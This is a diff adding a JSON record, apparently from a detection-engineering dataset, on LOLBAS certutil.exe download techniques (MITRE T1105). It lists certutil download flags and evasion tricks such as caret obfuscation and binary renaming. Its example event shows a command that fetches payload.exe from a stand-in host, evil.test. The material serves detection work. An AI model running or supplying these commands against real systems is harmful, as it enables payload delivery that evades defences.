@@ -1,0 +1,17 @@
+{
+  "id": "lolbas-certutil-download",
+  "partition": "red",
+  "title": "LOLBAS — Certutil.exe download primitives",
+  "source": "LOLBAS Project",
+  "provenance": "curated — commands verbatim from LOLBAS / Atomic Red Team T1105 (fetched 2026-07-14)",
+  "source_url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
+  "techniques": ["T1105"],
+  "tactic": "Command and Control / Ingress Tool Transfer",
+  "text": "certutil.exe is a signed Microsoft binary that can download arbitrary files, living off the land past application allowlisting. Download primitives: 'certutil -urlcache -split -f <url> <out>' and 'certutil -verifyctl -split -f <url>'. Also '-urlcache' without '-split', and the '-URL' GUI flag. Evasion notes an attacker combines with: casing changes, caret obfuscation in the command token (c^ertutil), and renaming the binary (see Rename System Utilities T1036.003). Any detection that lists only '-urlcache'/'-verifyctl' should also consider these alternate download flags.",
+  "example_event": {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "OriginalFileName": "CertUtil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  }
+}
